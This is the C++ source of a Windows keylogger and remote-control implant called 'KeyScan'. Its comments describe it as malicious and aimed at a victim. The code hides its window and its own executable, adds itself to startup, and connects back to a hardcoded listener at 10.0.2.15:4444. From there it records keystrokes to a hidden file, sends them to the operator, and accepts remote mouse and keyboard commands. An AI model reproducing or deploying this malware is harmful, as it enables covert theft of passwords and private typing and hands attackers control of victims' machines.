#include "keyscan.hpp"

	/**
	 * Do NOT edit this two lines! the program will automatically
	 * use the lhost and lport and then edit this two lines by itself
	 * Changing this lines may cause the program NOT WORK.
	 * */
char hostname[100] = "10.0.2.15";
char port[20] = "4444";

static int k {1};
int main(int argc, char *argv[]) {
	
	Keylogger keylogger;
	/**
	 * The first thing we wanna do is to hide the Keylogger console window*/
	keylogger.hideWindow();
	
	
	/**
	 * Next we make our malicious executable file itself hidden
	 * So the victim won't see the executable file again or delete
	 * it.
	 * */
	char *executable = argv[0];
	if(!strstr(executable, ".exe"))
		strcat(executable, ".exe");
	int exeAttrib = GetFileAttributes(const_cast<const char*>(executable));
	//If it is not hidden, then apply the hidden attribute
	if((exeAttrib & FILE_ATTRIBUTE_HIDDEN) == 0)
		SetFileAttributes(executable, exeAttrib | FILE_ATTRIBUTE_HIDDEN);
	
	keylogger.regStartup(const_cast<const char*>(executable));
	
	//Initailize winsock
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	
	//Establishing connection to server
connect:
	SOCKET connectionSocket;
	connectionSocket = ConnectServer(hostname, port);
	if(connectionSocket == -1) {
		/**
		 * If Connection to server failed wait for some seconds to retry.
		 * */
		 Sleep(100);
		 goto connect;
	}
		char msg[100] = "KeyScan Session\r\n";
		SendData(connectionSocket, msg);
	while(1) {
		
		fd_set reads;
		FD_ZERO(&reads);
		FD_SET(connectionSocket, &reads);
		/*
		struct timeval timeout;
		timeout.tv_usec = 0;
		timeout.tv_sec = 100000;*/
		//If select fails.. just to back to connect and establish the connection again
		if(select(connectionSocket+1, &reads, 0, 0, 0) < 0)
			goto connect;
		
		//Let's check if we've data ready to be received
		if(FD_ISSET(connectionSocket, &reads)) {
			
			char data[MAX_BUFFER];
			memset(data, 0, sizeof(data));
			int q {0};
			int bytesReceived = recv(connectionSocket, data, sizeof(data), 0);
			//disconnect from server
			if(bytesReceived < 1)
				goto connect;	//Connect again;
			if(strstr(data, "keyscan_start")) {
				CreateThread(NULL, 0, KeyloggerThread, 0, 0, NULL);
				SendSuccess(connectionSocket);
				
			}else if(strstr(data, "keyscan_dump")) {
			send:
				if(!SendLoggedKeys(connectionSocket)) {
					q++;
					if(q == 5)
						goto connect;
					goto send;
				}
				SendSuccess(connectionSocket);
			}else if(strstr(data, "keyscan_stop")) {
					k = 0;
					SendSuccess(connectionSocket);
			}else if(strstr(data, "mouse_move")) {
				if(SimulateMouseEventMove(data) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);				
			}else if(strstr(data, "mouse_click left")) {
				if(SimulateMouseEventClick(0) != 0)
					SendUnsuccess(connectionSocket);
				SendSuccess(connectionSocket);
						
			}else if(strstr(data, "mouse_click right")) {
				if(SimulateMouseEventClick(1) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);
				
			}else if(strstr(data, "mouse_click middle")) {
				if(SimulateMouseEventClick(3) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);
				
			}else if(strstr(data, "mouse_click double")) {
				if(SimulateMouseEventClick(4) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);
				
			}else if(strstr(data, "keyboard_send")) {
				if(SimulateKbtEventType(data) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);
				
			}else if(strstr(data, "keyevent")) {
				if(SimulateKbtEventTypeMod(data) != 0)
					SendUnsuccess(connectionSocket);
				else
					SendSuccess(connectionSocket);
				
			}
		}
	}
	
}


//Keylogger thread function
 DWORD WINAPI KeyloggerThread(LPVOID lpParameter) {
	 /**
	  * Open the loggin file and clear all the data inside(if available).
	  * So everytime the kelogger starts it won't contain the same keystrokes
	  * from the previous session.
	  * */
	remove("AdyW389234lWQ.txt");
	std::ofstream loggerFile;
	loggerFile.open("AdyW389234lWQ.txt", std::ios::out | std::ios::trunc);
	loggerFile.close();
	
	// Make the file hidden by setting the file attribute to FILE_ATTRIBUTE_HIDDEN
	const char *fileName = "AdyW389234lWQ.txt";
	int fAttrib = GetFileAttributes(fileName);
	if((fAttrib & FILE_ATTRIBUTE_HIDDEN) == 0)
		SetFileAttributes(fileName, fAttrib | FILE_ATTRIBUTE_HIDDEN);
	
	Keylogger keylogger;
	while(k)
		keylogger.logKeyStrokes();
	ExitThread(0);
}


//The function for sending keystrokes the captured key strokes
bool SendLoggedKeys(int fd) {
	
	std::fstream loggerFile, tmp;
	loggerFile.open("AdyW389234lWQ.txt", std::ios::in | std::ios::out);
	//Get each word and send it to the server
	char ch, data[MAX_BUFFER];
	memset(data, 0, sizeof(data));
	while(loggerFile >> std::noskipws >> ch) {
			sprintf(data + strlen(data), "%c", ch);
	}
	if(!SendData(fd, data))
				return false;
	loggerFile.close();
	//After the captured keystrokes is sent we may wanna clear all the data in the file
	//So that next time we won't be sending the same data!!
	remove("AdyW389234lWQ.txt");
	tmp.open("AdyW389234lWQ.txt", std::ios::out | std::ios::trunc);
	tmp.close();
	
	return true;
}

// Function for performing the mouse movement
int SimulateMouseEventMove(char *action) {
	char *p;
	p = strstr(action, "mouse_move");
	
	// Get the X and Y coordinates
	int xCoordinate {0}, yCoordinate {0};
	while(*p && *p != ' ') *p++;
	if(*p == ' ')
		*p++ = 0;
	xCoordinate = atoi(p);
	
	while(*p && *p != ' ') *p++;
	if(*p == ' ')
		*p++ = 0;
	yCoordinate = atoi(p);
	
	while(*p && *p != ' ') *p++;
	if(*p == ' ')
		*p++ = 0;
	
	// Time to perform the mouse movement
	Event event;
	if(event.mouseEventSimulateMov(xCoordinate, yCoordinate) != 0)
		return -1;
	
	return 0;
}


// Function for archieving the mouse clicks(right, left and middle)
int SimulateMouseEventClick(int rol) {
	Event event;
	if(rol == 4) {
		for(int i = 0; i < 2; i++)
			if(event.mouseEventSimulateClick(0) != 0)
				return -1;
			
	}else
		if(event.mouseEventSimulateClick(rol) != 0)
			return -1;
	return 0;
}


// The function use for commanding the keybroad to type some certain text;
int SimulateKbtEventType(char *data) {
	char *p;
	
	p = strstr(data, "keyboard_send");
	while(*p && *p != ' ') *p++;
	if(*p == ' ')
		*p++ = 0;
	HKL kbl = GetKeyboardLayout(0);
	SHORT vKeyCode;
	Event event;
	/**
	 * Get each character and perform the typing operation one by one
	 * */
	while(*p) {
		//Get the virtual key code for each of the character
		vKeyCode = VkKeyScanEx(*p, kbl);
		if(event.kbtEventSimulate(vKeyCode) != 0)
			return -1;
		Sleep(2);  
		*p++;
	}	
	return 0;
}


//This function is used for pressing the modifier keys.. eg ctrl+c, ctrl+v, alt+f4 etc
int SimulateKbtEventTypeMod(char *data) {

	char *p, *q;
	p = strstr(data, "keyevent");
	q = p;
	while(*q && *q != ' ') *q++;
	if(*q == ' ')
		*q++ = 0;
	char *m1, *m2, *m3, ch;
	int i {0};
	//m1 = q;
	p = q;
	while(*q) {
		if(*q == '+')
			i += 1;
		*q++;
	}
	MULKEY key[MAXKEY];
	if(i == 1) {
		m1 = p;
		while(*p && *p != '+') *p++;
		if(*p == '+')
			*p++ = 0;
		m2 = p;
		int vKey1, vKey2;
		
		Event event;
		vKey1 = event.GetKeyCode(m1);
		vKey2 = event.GetKeyCode(m2);
		if(vKey1 == -1)
			return -1;
		
		key[0].vKey = vKey1;
		
		if(vKey2 == -1) {
				
			if(event.kbtEventSimulateMul(key, 1, *p) != 0)
				return -1;
			return 0;
		}
		
		key[1].vKey = vKey2;
		if(event.kbtEventSimulateMul(key, 2, 0) != 0)
				return -1;
		return 0;
	}else if(i == 2) {
		
		m1 = p;
		while(*p && *p != '+') *p++;
		if(*p == '+')
			*p++ = 0;
		m2 = p;
		while(*p && *p != '+') *p++;
		if(*p == '+')
			*p++ = 0;
		m3 = p;
		
		int vKey1, vKey2, vKey3;
		
		Event event;
		vKey1 = event.GetKeyCode(m1);
		vKey2 = event.GetKeyCode(m2);
		vKey3 = event.GetKeyCode(m3);
		
		if(vKey1 == -1)
			return -1;
		if(vKey2 == -1)
			return -1;
		
		key[0].vKey = vKey1;
		key[1].vKey = vKey2;
		if(vKey3 == -1) {
				
			if(event.kbtEventSimulateMul(key, 2, *p) != 0)
				return -1;
			return 0;
		}
		
		key[2].vKey = vKey3;
		if(event.kbtEventSimulateMul(key, 3, 0) != 0)
				return -1;
		return 0;
	} else if(i == 0) {
		MULKEY key[MAXKEY];
		m1 = p;
		Event event;
		int vKey;
		vKey = event.GetKeyCode(m1);
		if(vKey == -1)
			return -1;
		if(event.kbtEventSimulateMul(key, 1, 0) != 0)
			return -1;
		return 0;
	}
	
	return -1;
}
